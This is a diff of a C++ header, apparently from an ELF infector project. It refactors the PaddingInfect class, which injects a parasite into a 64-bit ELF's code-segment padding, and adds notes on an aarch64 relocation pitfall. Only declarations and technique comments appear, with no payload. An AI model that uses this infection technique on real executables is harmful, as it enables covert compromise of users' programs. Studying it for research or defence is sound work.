@@ -1,6 +1,6 @@
 #pragma once
 #include <elf.h>
-#include "common/mmap.hh"
+#include <span>
 
 namespace vt::infector {
 // This algorithm injects a parasite into an 64 bit elf's code segment padding,
@@ -32,15 +32,27 @@ namespace vt::infector {
 //    ...                        |     ajacent non-executable segment
 //    ...                       --
 
+// Warning: because the insertion point is always not going to be page aligned
+// (padding insertion), for arm's adrp insruction will break if the parasite
+// refers to rodata.
+// For example:
+//    adrp	x0, 0x0
+//    add x0, x0, #0x544 (compiler generated page offset.)
+// If the code is inserted at a place that is not a multiple of 4k, the
+// generated offset would be wrong.
+// Make sure the parasite doesnt merge text with rodata for aarch64 if this
+// infection method is used. This is not a problem for x86-64 because the
+// lea offset(%rip),%rdi can be relocated safely even to places that are not
+// page aligned.
 class PaddingInfect {
  public:
   size_t injected_host_size() { return host_size_; }
 
-  bool analyze(const common::Mmap<PROT_READ>& host_mapping,
-               const common::Mmap<PROT_READ>& parasite_mapping);
+  bool analyze(std::span<const std::byte> host_mapping,
+               std::span<const std::byte> parasite_mapping);
 
-  bool inject(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
-              common::Mmap<PROT_READ> parasite_mapping);
+  bool inject(std::span<std::byte> host_mapping,
+              std::span<const std::byte> parasite_mapping);
 
  private:
   size_t host_size_{};
